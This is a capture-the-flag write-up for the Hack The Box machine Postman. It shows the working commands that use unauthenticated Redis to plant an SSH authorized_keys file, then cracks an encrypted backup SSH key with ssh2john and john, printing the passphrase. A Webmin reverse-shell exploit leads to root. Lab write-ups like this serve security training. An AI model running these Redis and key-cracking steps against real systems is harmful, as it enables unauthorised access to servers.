---
title: HTB Postman
slug: postman
lang: en
platform: Hack The Box
category: Linux
headline: Redis authorized_keys abuse, encrypted SSH key recovery and Webmin privilege escalation
difficulty: Easy
objective: root
date: 2025-11-11
tags: [Linux, Redis, SSH, Webmin, Privilege Escalation]
---

# HTB Postman

## Executive Summary

Postman exposes Redis without authentication. Redis can write an SSH `authorized_keys` file for the `redis` user, providing initial shell access. Local enumeration reveals an encrypted `id_rsa.bak` file, which is cracked to obtain Matt's SSH access. Matt can authenticate to Webmin, and a Webmin exploit provides root code execution.

## Enumeration

The target exposed SSH, HTTP, Redis and Webmin.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.2.1 -oG allPorts
sudo nmap -p22,80,6379,10000 -sCV -oN Targeted 10.129.2.1
```

![[Pasted image 20260506114611.png|Initial port scan]]
![[Pasted image 20260506114712.png|Service enumeration]]
![[Pasted image 20251111111742.png|Redis information script]]

## Redis to SSH

Redis allowed writing files under its home directory. A public SSH key was written to `authorized_keys`.

```bash
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
redis-cli -h 10.129.2.1
config set dir /var/lib/redis/.ssh
config set dbfilename "authorized_keys"
save
ssh -i id_rsa redis@10.129.2.1
```

![[Pasted image 20260506114854.png|Redis authorized_keys preparation]]
![[Pasted image 20260506114935.png|SSH key spacing]]
![[Pasted image 20260506115009.png|Key imported into Redis]]
![[Pasted image 20260506115044.png|Redis writes authorized_keys]]
![[Pasted image 20260506115114.png|SSH as redis]]

The `redis` user could not read Matt's flag.

![[Pasted image 20251111114349.png|Permission denied for Matt user flag]]

## Matt SSH Key Recovery

No useful SUID binary was found, but `/opt/id_rsa.bak` contained an encrypted private key.

```bash
find / -perm -4000 2>/dev/null
cat /opt/id_rsa.bak
```

![[Pasted image 20251111114554.png|SUID enumeration]]
![[Pasted image 20251111115239.png|Encrypted id_rsa.bak]]

The key was converted with `ssh2john` and cracked.

```bash
ssh2john id_rsaMatt > hashMatt
john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashMatt
```

```text
computer2008
```

![[Pasted image 20260506115211.png|ssh2john output]]
![[Pasted image 20260506115342.png|Matt key passphrase cracked]]

Matt's SSH login succeeded.

![[Pasted image 20251111120052.png|SSH as Matt]]

## Webmin to root

Matt could authenticate to Webmin on port `10000`.

![[Pasted image 20251111120615.png|Webmin login as Matt]]

A Webmin exploit was prepared with a base64-encoded reverse shell payload.

![[Pasted image 20251111131014.png|Webmin exploit payload]]
![[Pasted image 20260506115430.png|Root listener]]
![[Pasted image 20251111131148.png|Webmin exploit execution]]

The callback returned a root shell.

## Key Takeaways

- Unauthenticated Redis can often be converted into SSH access if file writes are possible.
- Backup private keys are high-value targets even when encrypted.
- Webmin access with valid user credentials can become root execution depending on version and configuration.
